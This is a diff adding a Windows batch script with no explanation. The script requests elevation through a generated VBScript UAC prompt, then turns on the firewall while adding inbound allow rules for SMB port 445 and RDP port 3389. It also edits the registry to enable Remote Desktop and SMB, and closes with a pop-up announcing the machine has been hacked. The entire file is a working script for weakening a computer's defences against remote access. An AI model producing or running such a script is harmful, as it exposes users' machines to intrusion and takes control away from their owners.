@@ -1,1 +1,77 @@
+@echo off
+color a
 
+
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+
+
+
+if '%errorlevel%' NEQ '0' (
+
+
+
+goto UACPrompt
+
+
+
+) else ( goto gotAdmin )
+
+
+
+:UACPrompt
+
+
+
+echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+
+
+
+echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+
+
+"%temp%\getadmin.vbs"
+
+
+
+exit /B
+
+
+
+:gotAdmin
+
+
+
+if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
+
+color 0A 
+
+title Type 
+
+net start MpsSvc 
+
+sc config MpsSvc start= auto 
+
+netsh advfirewall set allprofiles state on 
+
+netsh advfirewall firewall delete rule name="445" protocol=TCP
+
+netsh advfirewall firewall delete rule name="445" protocol=UDP
+
+netsh advfirewall firewall delete rule name="3389" protocol=TCP
+
+netsh advfirewall firewall delete rule name="3389" protocol=UDP
+
+netsh advfirewall firewall add rule name="445" dir=in protocol=tcp localport=445 action=allow
+
+netsh advfirewall firewall add rule name="445" dir=in protocol=udp localport=445 action=allow
+
+netsh advfirewall firewall add rule name="3389" dir=in protocol=tcp localport=3389 action=allow
+
+netsh advfirewall firewall add rule name="3389" dir=in protocol=udp localport=3389 action=allow
+
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+
+REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters" "Server /v SMBDeviceEnabled /t REG_DWORD /d 1 /f
+
+msg * Note: yohbearetohcked!!
